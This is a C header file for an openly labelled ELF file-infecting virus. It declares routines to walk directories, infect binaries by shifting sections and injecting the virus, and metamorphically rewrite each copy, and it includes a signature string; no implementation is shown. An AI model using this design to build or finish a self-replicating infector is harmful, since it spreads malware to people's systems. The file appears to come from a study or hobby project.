
#ifndef VIRUS_H
# define VIRUS_H

# include <fcntl.h>
# include <linux/elf.h>
# include <stdbool.h>
# include <stdint.h>
# include <sys/types.h>
# include <unistd.h>

# include "loader.h"
# include "accessors.h"

/*
** hardcoded signature for
** "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"
*/

# define SIGNATURE_LEN		64
# define SIGNATURE_CKSUM	0x1526

/*
** entry point related informations
*/

struct				entry
{
	struct elf64_phdr	*safe_phdr;
	struct elf64_shdr	*safe_shdr;
	struct elf64_shdr	*safe_last_section_shdr;
	size_t			end_of_last_section;
	size_t			offset_in_section;
};

/*
** virus entry point and start routines
*/

void		virus(const struct virus_header *vhdr);
void		infect_files_in(const struct virus_header *vhdr, const char *root_dir);
bool		infect(const struct virus_header *vhdr, const char *file);
bool		infection_engine(struct virus_header *vhdr, struct safe_ptr clone_ref, struct safe_ptr file_ref);

/*
** infection engine routines
*/

bool		find_entry(struct entry *entry, struct safe_ptr ref);
bool		adjust_references(struct safe_ptr clone_ref, size_t shift_amount, size_t end_of_last_section);
bool		setup_virus_header(struct safe_ptr clone_ref, size_t end_of_last_section, struct virus_header vhdr);
bool		copy_client_to_clone(struct safe_ptr clone_ref, struct safe_ptr file_ref, size_t end_of_last_section, size_t shift_amount);
bool		copy_virus_to_clone(struct safe_ptr clone_ref, const struct entry *file_entry, const struct virus_header *vhdr);
bool		metamorph_clone(struct safe_ptr clone_ref, size_t loader_off, uint64_t seed, size_t *full_virus_size, const struct virus_header *vhdr);
bool		generate_seed(uint64_t *seed, struct safe_ptr file_ref);

/*
** elf iterators
*/

typedef	bool	(*f_iter_callback)(struct safe_ptr ref, size_t offset, void *data);

bool		foreach_phdr(struct safe_ptr ref, f_iter_callback callback, void *data);
bool		foreach_shdr(struct safe_ptr ref, f_iter_callback callback, void *data);

#endif
